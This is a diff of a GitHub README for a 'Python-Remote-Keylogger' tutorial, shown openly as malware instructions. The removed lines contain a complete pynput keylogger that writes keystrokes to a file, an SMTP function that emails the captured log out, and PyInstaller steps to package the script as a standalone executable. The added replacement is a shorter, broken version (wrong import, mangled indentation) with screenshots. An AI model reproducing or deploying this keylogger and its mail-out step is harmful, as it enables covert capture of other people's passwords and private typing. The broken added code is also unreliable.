@@ -1,101 +1,88 @@
 # Python-Remote-Keylogger-
 Creating a python keylogger to record keystrokes remotely. 
 
-Objective:
+# Objective:
 
 Build a Python-based keylogger to:
-	1.	Record keystrokes locally.
-	2.	Save them to a log file.
-	3.	Optionally email the logs to yourself for testing purposes.
+	
+ 1.	Record keystrokes locally.
+	
+ 2.	Save them to a log file.
+	
 
-Prerequisites:
-	1.	Programming Knowledge: Basic understanding of Python.
-	2.	Environment: Python installed on your system.
-	3.	Libraries: Install the necessary Python libraries:
-	•	pynput (to capture keystrokes).
-	•	smtplib (for sending emails, optional).
+# Prerequisites:
+	
+ 1.	Programming Knowledge: Basic understanding of Python.
+	
+ 2.	Environment: Python installed on your system.
+	
+ 3.	Libraries: Install the necessary Python libraries:
+	
+ 	pynput (to capture keystrokes).
+	
+ 
 
 Install dependencies:
 
 pip install pynput
 
-Step 1: Capture Keystrokes
-	1.	Import the pynput library:
-
-from pynput.keyboard import Key, Listener
+![Screenshot 2025-01-06 232309](https://github.com/user-attachments/assets/8e696666-3e46-4c1d-a94a-1a1cdbef4d26)
 
 
-	2.	Define a function to log keystrokes:
 
-def on_press(key):
-    try:
-        with open("key_log.txt", "a") as log_file:
-            log_file.write(f"{key.char}")
-    except AttributeError:
-        with open("key_log.txt", "a") as log_file:
-            log_file.write(f" {str(key)} ")
+# Step 1: Capture Keystrokes
+	
+ 
+ 1.	Import the pynput library:
+
+		from pynput.keyboard import pynput
 
 
-	3.	Define a function to handle special keys:
+2.    Define a function for file handling:
 
-def on_release(key):
-    if key == Key.esc:  # Stop logging when Esc is pressed
-        return False
+  			with open("log.txt", "w") as log:
+    			log.write("")
+  
 
-
-	4.	Set up the key listener:
-
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
-
-Step 2: Save Logs to a File
-
-The captured keystrokes will be saved to a file named key_log.txt in the same directory as the script.
-
-Step 3: Send Logs via Email (Optional)
-
-If you’d like to email the logs (for testing purposes only), follow these steps:
-	1.	Import the smtplib library:
-
-import smtplib
-from email.mime.text import MIMEText
+	
+  4.	Define a function to log keystrokes:
 
 
-	2.	Define a function to send the email:
+			def on_press(key):
 
-def send_email():
-    sender_email = "your_email@example.com"
-    receiver_email = "your_email@example.com"
-    password = "your_email_password"
-    
-    with open("key_log.txt", "r") as log_file:
-        log_content = log_file.read()
-    
-    message = MIMEText(log_content)
-    message["Subject"] = "Keylogger Logs"
-    message["From"] = sender_email
-    message["To"] = receiver_email
-    
-    with smtplib.SMTP("smtp.example.com", 587) as server:
-        server.starttls()
-        server.login(sender_email, password)
-        server.sendmail(sender_email, receiver_email, message.as_string())
+ try:
+ 
+ 		with open("log.txt", "a") as log:
+          	log.write(f"{key}\n")
 
 
-	3.	Call send_email() at regular intervals (e.g., after logging a certain number of keystrokes).
-
-Step 4: Add Error Handling
-
-Enhance the script to handle errors, such as permissions issues or missing libraries.
-
-Step 5: Package the Keylogger
-	1.	Convert the script to an executable for testing purposes using PyInstaller:
-
-pip install pyinstaller
-pyinstaller --onefile keylogger.py
+	
+ 4.	Set up the key listener:
 
 
-	2.	The executable will be created in the dist folder.
+		with 
+ 		pynput.keyboard.Listener(on_press=on_press) as listener:
+    		listener.join()
 
-Step 6: Test in a Virtual Environment
-	•	Run the keylogger in a controlled environment (e.g., a virtual machine) to observe its functionality.
+
+![Screenshot 2025-01-08 230006](https://github.com/user-attachments/assets/eb3f5535-5c59-45b4-b06c-47830bb21aea)
+
+
+
+# Step 2: Test in a Virtual Environment
+	
+ Run the keylogger in a controlled environment (e.g., a virtual machine) to observe its functionality. I'm running it on the terminal in visual code.
+
+ ![Screenshot 2025-01-08 230235](https://github.com/user-attachments/assets/29b800d0-6277-4c8f-87d2-7b98488e86e6)
+
+
+
+# Step 3: Save Logs to a File
+
+
+The captured keystrokes will be saved to a file named log.txt in the same directory as the script.
+
+![Screenshot 2025-01-08 000119](https://github.com/user-attachments/assets/77cee983-9701-499f-82e3-82d7dd409981)
+
+
+
